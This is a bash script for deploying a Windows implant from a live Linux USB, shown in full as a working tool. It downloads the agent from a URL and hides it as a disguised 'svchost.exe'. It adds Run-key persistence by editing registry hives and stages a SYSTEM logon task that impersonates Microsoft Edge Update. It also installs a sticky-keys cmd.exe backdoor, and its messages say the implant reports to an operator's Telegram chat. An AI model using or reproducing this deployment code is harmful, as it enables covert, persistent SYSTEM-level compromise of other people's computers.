#!/usr/bin/env bash
# =============================================================================
# deploy_telegram.sh
#
# Install the SentinelC2 / Telegram-variant Windows implant onto a target
# Windows partition from a live Linux USB.
#
# What it does
# ------------
#   1. Mounts the Windows NTFS partition read-write at $MOUNT
#   2. (Optional) downloads the agent binary from a URL into /tmp
#   3. Drops agent_telegram.exe into a stealthy install path
#   4. Adds HKLM Run-key persistence via direct registry-hive edit
#   5. Adds HKCU Run-key persistence in every user NTUSER.DAT
#   6. Stages a SYSTEM-context AtLogOn scheduled-task XML
#   7. Replaces sethc.exe with cmd.exe (sticky-keys backdoor)
#   8. Unmounts cleanly
#
# Usage
# -----
#   sudo ./deploy_telegram.sh /dev/sda2                          # agent.exe in cwd
#   sudo ./deploy_telegram.sh /dev/sda2 --agent ./agent_telegram.exe
#   sudo ./deploy_telegram.sh /dev/sda2 --agent https://x.io/agent.exe    # download from URL
#   sudo ./deploy_telegram.sh /dev/sda2 --no-stickey
#   sudo ./deploy_telegram.sh /dev/sda2 --verify                 # don't write, just check
#
# BitLocker
# ---------
#   If Windows is BitLocker-encrypted, mount the recovery key first:
#     sudo apt install -y dislocker
#     sudo mkdir -p /mnt/disk /mnt/win
#     sudo dislocker /dev/sda2 --user-recovery-password 123456-... /mnt/disk
#     sudo mount -o rw /mnt/disk/dislocker-file /mnt/win
#   Then run with /mnt/win as the partition: this script will only see
#   the dislocker-file image if you point it directly there. Simpler:
#   just mount the dislocker image and point this script at /mnt/win.
# =============================================================================

set -euo pipefail

# ---- defaults ----------------------------------------------------------------
AGENT_SRC="${PWD}/agent_telegram.exe"
MOUNT="/mnt/sentinel-target"
INSTALL_REL="ProgramData/Microsoft/Network/Connections/Cm"
INSTALL_NAME="svchost.exe"
RUN_KEY_PATH="Microsoft\\Windows\\CurrentVersion\\Run"
RUN_VALUE="MicrosoftEdgeUpdate"
TASK_NAME="MicrosoftEdgeUpdateTaskMachine"
DO_STICKY=1
DO_TASK=1
DO_RUNKEY=1
VERIFY_ONLY=0
BACKUP_HIVES=1

# ---- args --------------------------------------------------------------------
WIN_PART=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --agent)        AGENT_SRC="$2"; shift 2;;
    --mount)        MOUNT="$2"; shift 2;;
    --no-stickey)   DO_STICKY=0; shift;;
    --no-task)      DO_TASK=0; shift;;
    --no-runkey)    DO_RUNKEY=0; shift;;
    --verify)       VERIFY_ONLY=1; shift;;
    --no-backup)    BACKUP_HIVES=0; shift;;
    -h|--help)
      sed -n '2,40p' "$0"; exit 0;;
    /*)             WIN_PART="$1"; shift;;
    *)              echo "[-] unknown arg: $1" >&2; exit 1;;
  esac
done

# ---- helpers -----------------------------------------------------------------
red()    { printf "\033[31m%s\033[0m\n" "$*"; }
green()  { printf "\033[32m%s\033[0m\n" "$*"; }
yellow() { printf "\033[33m%s\033[0m\n" "$*"; }
info()   { echo "[+] $*"; }
warn()   { yellow "[-] $*";  }
die()    { red "[!] $*" >&2; exit 1; }

require_root() {
  if [[ $EUID -ne 0 ]]; then
    die "must run as root (sudo)."
  fi
}

detect_tools() {
  # Tools we use and where to find them. Some are optional (we degrade
  # gracefully if they're missing).
  REGEDIT_TOOL=""
  for t in hivexsh python3; do
    if command -v "$t" >/dev/null 2>&1; then
      REGEDIT_TOOL="$t"
      break
    fi
  done

  if ! command -v ntfs-3g >/dev/null 2>&1 && ! command -v mount.ntfs3 >/dev/null 2>&1; then
    warn "neither ntfs-3g nor ntfs3 mount helper found; will fall back to plain mount"
  fi
}

mount_target() {
  local dev="$1" mnt="$2"
  mkdir -p "$mnt"
  if mount | grep -q " on $mnt "; then
    info "already mounted at $mnt"
    return 0
  fi
  info "mounting $dev -> $mnt (rw)"
  if command -v mount.ntfs-3g >/dev/null 2>&1; then
    mount -t ntfs-3g -o rw,force "$dev" "$mnt" && return 0
  fi
  if command -v mount.ntfs3 >/dev/null 2>&1; then
    mount -t ntfs3 -o rw "$dev" "$mnt" && return 0
  fi
  # Last-ditch: let the kernel pick the driver
  mount -o rw "$dev" "$mnt" || die "failed to mount $dev at $mnt"
}

unmount_target() {
  local mnt="$1"
  info "unmounting $mnt"
  umount "$mnt" 2>/dev/null || warn "umount returned non-zero (target busy?)"
}

is_windows_dir() {
  [[ -d "$1/Windows" ]] && [[ -d "$1/Windows/System32" ]]
}

# ---- hive-editing primitives -------------------------------------------------
# We support two strategies, picked at runtime:
#   (a) python3 with the `regipy` package  (best portability, no compile)
#   (b) `hivexsh` from libhivex             (native, faster)
# Each emits the same effect: a REG_SZ value at the given key path.

edit_hive_set_value() {
  # $1 = hive file path (absolute, on the mounted Windows partition)
  # $2 = registry key path (e.g. "Microsoft\Windows\CurrentVersion\Run")
  # $3 = value name (e.g. "MicrosoftEdgeUpdate")
  # $4 = value data (e.g. "C:\ProgramData\...\svchost.exe")
  local hive="$1" key="$2" name="$3" data="$4"

  if [[ "$REGEDIT_TOOL" == "python3" ]] && python3 -c 'import regipy' >/dev/null 2>&1; then
    python3 - "$hive" "$key" "$name" "$data" <<'PY'
import sys
from regipy.registry import RegistryHive
from regipy.exceptions import RegistryKeyNotFoundException

hive_path, key_path, val_name, val_data = sys.argv[1:5]
reg = RegistryHive(hive_path)
try:
    k = reg.get_key(key_path)
except RegistryKeyNotFoundException:
    k = reg.root
    for part in key_path.split("\\"):
        k = k.add_subkey(part)
k.set_value(val_name, val_data)
reg.save(hive_path)
PY
    return $?
  fi

  if command -v hivexsh >/dev/null 2>&1; then
    # hivexsh is interactive, so feed it via stdin
    hivexsh --open "$hive" <<EOF
cd \\$key
setval "$name" REG_SZ "$data"
commit
EOF
    return $?
  fi

  return 127   # no tool available
}

# ---- install steps -----------------------------------------------------------
step_install_binary() {
  local win="$1" src="$2" rel="$3" name="$4"
  local dest_dir="$win/$rel"
  local dest="$dest_dir/$name"

  if [[ ! -f "$src" ]]; then
    die "agent binary not found: $src"
  fi
  if [[ $(stat -c%s "$src") -lt 50000 ]]; then
    die "agent binary looks too small ($(stat -c%s "$src") B) — did the build succeed?"
  fi

  mkdir -p "$dest_dir"
  cp -f "$src" "$dest"
  chmod 0755 "$dest"
  # Hidden + system file attributes (NTFS MFT entry)
  if command -v ntfs-3g >/dev/null 2>&1; then
    # setfattr is on every modern Linux; sets the "DOS" file attribute
    # through ntfs-3g's ntfs-3g.metadata pseudo-xattr.
    if command -v setfattr >/dev/null 2>&1; then
      # Bit 0x02 = hidden, 0x04 = system. Bitwise OR = 0x06.
      setfattr -n system.ntfs_dos_name -v "0x06" "$dest" 2>/dev/null || true
    fi
  fi
  info "  installed: $dest"
  echo "$dest" > /tmp/.sentinel_target_path
}

step_backup_hives() {
  local win="$1"
  local bkp="/tmp/sentinel_hive_backups_$(date +%Y%m%d_%H%M%S)"
  if [[ $BACKUP_HIVES -eq 0 ]]; then
    info "  (skipping hive backups)"
    return
  fi
  mkdir -p "$bkp"
  cp "$win/Windows/System32/config/SOFTWARE" "$bkp/" 2>/dev/null || warn "SOFTWARE backup failed"
  cp "$win/Windows/System32/config/SYSTEM"   "$bkp/" 2>/dev/null || warn "SYSTEM backup failed"
  for u in "$win/Users"/*/NTUSER.DAT; do
    [[ -f "$u" ]] && cp "$u" "$bkp/$(basename "$(dirname "$u")").DAT" 2>/dev/null
  done
  info "  hive backups in: $bkp"
}

step_runkey_hklm() {
  local win="$1" target="$2"
  local hive="$win/Windows/System32/config/SOFTWARE"
  if [[ ! -f "$hive" ]]; then
    warn "SOFTWARE hive not found at $hive"
    return
  fi
  info "  HKLM\\...\\Run\\$RUN_VALUE = \"$target\""
  if [[ $VERIFY_ONLY -eq 0 ]]; then
    edit_hive_set_value "$hive" "$RUN_KEY_PATH" "$RUN_VALUE" "\"$target\"" \
      || warn "HKLM edit failed (registry tool missing?)"
  fi
}

step_runkey_hkcu_all() {
  local win="$1" target="$2"
  local users="$win/Users"
  [[ -d "$users" ]] || { warn "Users dir not found"; return; }
  for user_dir in "$users"/*/; do
    local name
    name=$(basename "$user_dir")
    case "$name" in
      Public|Default|"Default User"|"All Users") continue;;
    esac
    local hive="$user_dir/NTUSER.DAT"
    [[ -f "$hive" ]] || continue
    info "  HKCU $name\\...\\Run\\$RUN_VALUE = \"$target\""
    if [[ $VERIFY_ONLY -eq 0 ]]; then
      edit_hive_set_value "$hive" "$RUN_KEY_PATH" "$RUN_VALUE" "\"$target\"" \
        || warn "HKCU edit for $name failed"
    fi
  done
}

step_scheduled_task() {
  local win="$1" target="$2"
  local tasks_dir="$win/Windows/System32/Tasks"
  local task_file="$tasks_dir/$TASK_NAME"
  local cmd_escaped="${target//\\/\\\\}"
  mkdir -p "$tasks_dir"
  info "  scheduled task: $task_file"
  if [[ $VERIFY_ONLY -eq 0 ]]; then
    # Windows Task Scheduler reads XML in UTF-16 LE with BOM.
    python3 - "$task_file" "$cmd_escaped" <<'PY' || warn "task XML write failed"
import sys, struct
task_path, cmd = sys.argv[1], sys.argv[2]
xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.</Description>
    <URI>\\MicrosoftEdgeUpdateTaskMachineUA</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>5</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{cmd}</Command>
    </Exec>
  </Actions>
</Task>
'''
    with open(task_path, "wb") as f:
      f.write(b'\xff\xfe')            # UTF-16 LE BOM
      f.write(xml.encode("utf-16-le"))
PY
  fi
}

step_sticky_keys() {
  local win="$1"
  local sethc="$win/Windows/System32/sethc.exe"
  local sethc_bak="$win/Windows/System32/sethc.exe.bak"
  local cmd_exe="$win/Windows/System32/cmd.exe"

  [[ -f "$sethc"  ]] || { warn "sethc.exe not found, skipping";  return; }
  [[ -f "$cmd_exe" ]] || { warn "cmd.exe not found, skipping";   return; }

  if [[ -f "$sethc_bak" ]]; then
    info "  sticky-keys: already installed (sethc.exe.bak present)"
    return
  fi
  info "  sticky-keys: installing (Shift 5x at lock screen -> SYSTEM cmd)"
  if [[ $VERIFY_ONLY -eq 0 ]]; then
    cp -f "$sethc"   "$sethc_bak"
    cp -f "$cmd_exe" "$sethc"
    chmod 0755 "$sethc"
  fi
}

# ---- main --------------------------------------------------------------------
main() {
  require_root
  detect_tools
  if [[ -z "$WIN_PART" ]]; then
    sed -n '2,40p' "$0" >&2
    die "usage: $0 <windows-partition> [options]"
  fi
  if [[ $VERIFY_ONLY -eq 0 ]]; then
    # If --agent is a URL, download it now into /tmp.
    if [[ "$AGENT_SRC" =~ ^https?:// ]]; then
      local_url="$AGENT_SRC"
      AGENT_SRC="/tmp/agent_telegram.exe"
      info "downloading agent from: $local_url"

      # MEGA: needs megatools (JavaScript-decryption shim, can't curl).
      if [[ "$local_url" =~ mega\.nz ]]; then
        if ! command -v megadl >/dev/null 2>&1; then
          info "installing megatools (needed for MEGA links)..."
          if command -v apt-get >/dev/null 2>&1; then
            apt-get update -qq && apt-get install -y megatools >/dev/null 2>&1 \
              || die "apt install megatools failed - install by hand then re-run"
          elif command -v dnf >/dev/null 2>&1; then
            dnf install -y megatools >/dev/null 2>&1 \
              || die "dnf install megatools failed - install by hand then re-run"
          else
            die "no apt/dnf found - install megatools by hand and re-run"
          fi
        fi
        info "  megadl $local_url"
        megadl --no-progress --path /tmp "$local_url" \
          || die "megadl failed for $local_url"
        # megadl keeps the original filename; rename to expected path
        # and search /tmp for the largest recent .exe
        downloaded=$(ls -t /tmp/*.exe 2>/dev/null | head -1)
        if [[ -z "$downloaded" || "$downloaded" == "$AGENT_SRC" ]]; then
          die "megadl finished but no .exe found in /tmp"
        fi
        mv -f "$downloaded" "$AGENT_SRC"
        chmod 0755 "$AGENT_SRC"
      else
        # Generic HTTPS: try curl, then wget
        if command -v curl >/dev/null 2>&1; then
          curl -fsSL --retry 2 -o "$AGENT_SRC" "$local_url" \
            || die "download failed: $local_url"
        elif command -v wget >/dev/null 2>&1; then
          wget -q -O "$AGENT_SRC" "$local_url" \
            || die "download failed: $local_url"
        else
          die "neither curl nor wget found - install one or pass a local --agent path"
        fi
      fi
      info "  -> $AGENT_SRC ($(stat -c%s "$AGENT_SRC") B)"
    fi
    if [[ ! -f "$AGENT_SRC" ]]; then
      die "agent binary not found: $AGENT_SRC"
    fi
  fi

  mount_target "$WIN_PART" "$MOUNT"
  local win="$MOUNT"
  if ! is_windows_dir "$win"; then
    warn "no Windows directory at $win — wrong partition? checking anyway"
  fi

  # Verify_only skips writes but still reports the install path
  local target_path
  target_path="$win/$INSTALL_REL/$INSTALL_NAME"

  trap 'unmount_target "$MOUNT"' EXIT

  if [[ $VERIFY_ONLY -eq 0 ]]; then
    step_backup_hives "$win"
  fi
  step_install_binary "$win" "$AGENT_SRC" "$INSTALL_REL" "$INSTALL_NAME" \
    || true   # step_install_binary writes $target_path
  # Re-resolve in case the step function above changed anything
  target_path="$win/$INSTALL_REL/$INSTALL_NAME"

  if [[ $DO_RUNKEY -eq 1 ]]; then
    step_runkey_hklm "$win" "$target_path"
    step_runkey_hkcu_all "$win" "$target_path"
  fi
  if [[ $DO_TASK -eq 1 ]]; then
    step_scheduled_task "$win" "$target_path"
  fi
  if [[ $DO_STICKY -eq 1 ]]; then
    step_sticky_keys "$win"
  fi

  trap - EXIT
  unmount_target "$MOUNT"

  echo ""
  green "[+] Deploy complete."
  info "reboot the target. Within a few seconds of the first user logon,"
  info "your Telegram chat will receive the agent's online message."
  if [[ $DO_STICKY -eq 1 ]]; then
    info "press Shift 5x at the Windows lock screen for a SYSTEM cmd shell."
  fi
}

main "$@"
